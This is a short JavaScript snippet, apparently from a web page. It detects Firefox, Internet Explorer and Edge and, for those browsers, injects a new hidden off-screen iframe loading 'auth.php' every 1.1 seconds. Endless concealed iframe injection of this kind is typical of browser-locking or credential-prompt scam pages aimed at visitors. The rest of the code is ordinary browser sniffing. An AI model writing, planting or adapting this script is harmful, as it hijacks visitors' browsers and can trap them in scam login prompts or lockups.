/*<![CDATA[*/

 function get_browser(){
		var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
		if(/trident/i.test(M[1])){
				tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
				return {name:'IE',version:(tem[1]||'')};
				}
		if(M[1]==='Chrome'){
				tem=ua.match(/\bOPR\/(\d+)/)
				if(tem!=null)   {return {name:'Opera', version:tem[1]};}
				}
		M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
		if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
		return {
			name: M[0],
			version: M[1]
		};
 }
 var InternetEx=window.navigator.appVersion.indexOf("MSIE")!=-1;
var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
var browser=get_browser();
if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)) ){
	if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
		{

			 function msg_ff() {

						var i = document.createElement("div");
						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="auth.php"></iframe></div>';
						document.body.appendChild(i);

				}
				window.setInterval(function() {
						msg_ff();

				}, 1100);

			}
	else{
			function msg_ff() {

						var i = document.createElement("div");
						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="auth.php"></iframe></div>';
						document.body.appendChild(i);
				}
				window.setInterval(function() {
						msg_ff();

				}, 1100);

		}

 }
 else{

	 }


/*]]>*/